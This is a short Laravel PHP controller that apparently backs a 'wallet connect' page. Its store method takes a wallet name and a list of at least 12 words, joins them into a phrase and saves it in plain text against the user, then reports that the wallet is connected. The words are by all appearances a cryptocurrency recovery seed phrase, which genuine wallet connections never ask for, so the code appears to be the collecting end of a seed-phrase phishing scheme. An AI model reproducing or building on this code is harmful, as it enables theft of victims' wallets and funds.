<?php

namespace App\Http\Controllers;

use App\Models\WalletConnect;
use Illuminate\Http\Request;

class WalletConnectController extends Controller
{
    public function store(Request $request)
    {
        $validatedData = $request->validate([
            'wallet' => 'nullable|string|max:255',
            'phrase' => 'required|array|min:12', // Validate that it's an array with at least 12 items
            'phrase.*' => 'required|string|max:255', // Validate each phrase part
        ]);

        try {
            // Concatenate the phrase array into a single string with spaces
            $concatenatedPhrase = implode(' ', $validatedData['phrase']);

            WalletConnect::create([
                'user_id' => auth()->id(),
                'wallet' => $validatedData['wallet'],
                'phrase' => $concatenatedPhrase, // Store the concatenated phrase
            ]);

            return redirect()->back()
                ->with('success', 'Wallet connected successfully.');
        } catch (\Exception $e) {
            // Redirect back with an error message
            return redirect()
                ->back()
                ->with('error', 'An error occurred while connecting the wallet: ' . $e->getMessage());
        }
    }



}
